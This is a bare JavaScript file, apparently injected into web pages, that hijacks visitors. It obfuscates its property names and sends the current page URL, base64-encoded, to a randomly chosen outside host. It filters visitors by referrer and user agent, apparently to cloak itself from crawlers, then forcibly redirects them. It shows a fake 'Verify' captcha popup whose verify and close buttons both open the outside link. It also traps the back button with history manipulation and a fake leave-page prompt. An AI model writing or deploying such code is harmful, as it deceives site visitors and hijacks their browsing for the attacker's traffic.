
function sa(arr){return arr[Math.floor(arr.length * Math.random())];}
var setsearn = Object.create(searn);
var svarb= ["berkah-by_radiant","href","location","referrer","userAgent","assign","createElement","btoa"];
var glnk = sa(setsearn.mnt_st)+'/?'+setsearn.sm_srn+'='+encodeURIComponent(window[svarb[7]](window[svarb[2]][svarb[1]]));

function radipopup(){
	function swonscroll(){
		if(setsearn.wthscrl === "direct"){
			sessionStorage.setItem('setim_swpop', glnk);
			window[svarb[2]][[svarb[1]]] = glnk;
		}
		if (window.scrollY > 50) {
			document.getElementById("setim_popbox").classList.remove("hide");
			window.removeEventListener("scroll", swonscroll, false);
		}
	}

	document.addEventListener("DOMContentLoaded", function() {
		document.head.appendChild(document.createElement("style")).innerHTML='.hide{display:none!important;visibility:hidden!important}.popbox{position:fixed;width:100%;top:0;left:0;bottom:0;background:rgba(225,225,225,.9);z-index:99999}.popcontent{display:block;position:absolute;background:#fff;width:30%;top:50%;left:50%;padding:15px 10px 6px 10px;border-radius:6px;overflow:hidden;transform:translate(-50%,-50%);box-shadow:0 3px 15px 0 rgba(0,0,0,.5)}.popcontent img{width:90%;display:block}#setim_popcls{position:absolute;right:0;top:0;cursor:pointer;background-color:transparent;padding:1px 9px;color:red;font-size:1.3em;transition:all 0.3s ease;line-height:1.5;border:3px solid transparent;border-radius:50%;text-decoration:none}#setim_popcnfrm{display:inline-block;font-size:.9em;line-height:1.3;border:3px solid transparent;padding:3px 15px;border-radius:.2em;text-align:center;cursor:pointer;color:#fff;background-color:#125ab8;transition:all 0.3s ease;text-decoration:none}@media screen and (max-width:840px){.popcontent{width:70%;top:40%}}';
		let popui = `<div id="setim_popbox" class="popbox hide"><div class="popcontent" align="center"><button id="setim_popcls">&#128473;</button><img id="setim_img" src="https://cdn.jsdelivr.net/gh/Iquaridys/notpopjs/capca.gif" alt="" ondragstart="return false;"/><p id="setim_pleft" class="hide">Are you sure you want to leave this page?</p><button id="setim_popcnfrm">Verify</button></div></div>`;
		document.body.insertAdjacentHTML('beforeend',popui);
		if(!sessionStorage.setim_swpop){
			if(setsearn.wthscrl){
				window.addEventListener("scroll", swonscroll,false);
			}else{
				document.getElementById("setim_popbox").classList.remove("hide");
			}
		}
	});

	document.getElementById('setim_popbox').addEventListener("click",function(e){
		if(e.target){
			if(e.target.id === 'setim_popcnfrm' || e.target.id === 'setim_popcls'){
				e.preventDefault();
				sessionStorage.setItem('setim_swpop', glnk);
				window.open(glnk, "_blank");
				window[svarb[2]][[svarb[1]]] = sa(setsearn.mnt_af);
			}
		}
	});
}

function radipop(){
	if(setsearn.wthpop){
		radipopup();
	}else{
		sessionStorage.setItem('setim_swpop', glnk);
		window[svarb[2]][[svarb[1]]] = glnk;
	}
}

if(setsearn.wthrules){
	if(!setsearn.usrgn.test(navigator[svarb[4]])){
		if(setsearn.srefl.test(document[svarb[3]]) || setsearn.srefl.test(navigator[svarb[4]])){
			radipop();
		}
	}
}else{
	radipop();
}

if(sessionStorage.setim_swpop2){
	window[svarb[2]][[svarb[1]]] = glnk;
}else if(sessionStorage.setim_swpop){
	sessionStorage.setItem('setim_swpop2', "true");
	history.back();
}

if(setsearn.wthbck){
	if(!sessionStorage.setim_swpop){
		window.history.pushState({}, document.title, location.pathname);
		window.onpopstate = function(event) {
			window.history.pushState({}, document.title, location.pathname);
			if(setsearn.wthbck === "direct"){
				sessionStorage.setItem('setim_swpop', glnk);
				window[svarb[2]][[svarb[1]]] = glnk;
			}else{
				document.getElementById("setim_popbox").classList.remove("hide");
				document.getElementById("setim_pleft").classList.remove("hide");
				document.getElementById("setim_img").classList.add("hide");
				document.getElementById('setim_popcnfrm').text = "Yes";
			}
		}
	}
}
